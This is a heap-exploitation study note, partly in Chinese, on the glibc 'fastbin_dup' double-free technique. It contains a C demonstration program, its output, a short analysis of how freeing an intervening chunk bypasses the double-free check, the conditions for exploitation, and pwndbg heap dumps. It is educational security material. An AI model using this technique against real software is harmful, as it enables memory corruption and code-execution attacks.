# fastbin_dup
```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	a = malloc(8);
	b = malloc(8);
	c = malloc(8);
	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	assert(a == c);
}
```

**result**

```c
This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0xf60010
2nd malloc(8): 0xf60030
3rd malloc(8): 0xf60050
Freeing the first one...
If we free 0xf60010 again, things will crash because 0xf60010 is at the top of the free list.
So, instead, we'll free 0xf60030.
Now, we can free 0xf60010 again, since it's not the head of the free list.
Now the free list has [ 0xf60010, 0xf60030, 0xf60010 ]. If we malloc 3 times, we'll get 0xf60010 twice!
1st malloc(8): 0xf60010
2nd malloc(8): 0xf60030
3rd malloc(8): 0xf60010
```

**analysis**

这里演示了double free漏洞，将一个chunk放入了fast bins中两次。程序会检查链表头的指针是否与即将free的chunk指向同一块内存，如果是就会引发double free错误。但是可以通过在两次free之间free一个其他的chunk达到绕过检测的目的。

**利用条件**

- 可申请fast bin的chunk
- free之后，指针不会被销毁

**gdb**

申请三个chunk后heap布局如下：

```cpwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x602000
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x602020
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x602040
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x602060
Size: 0x20fa1
```

free之后：

```cfastbins
fastbins
0x20: 0x602000 —▸ 0x602020 ◂— 0x602000
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

成功将a堆块free两次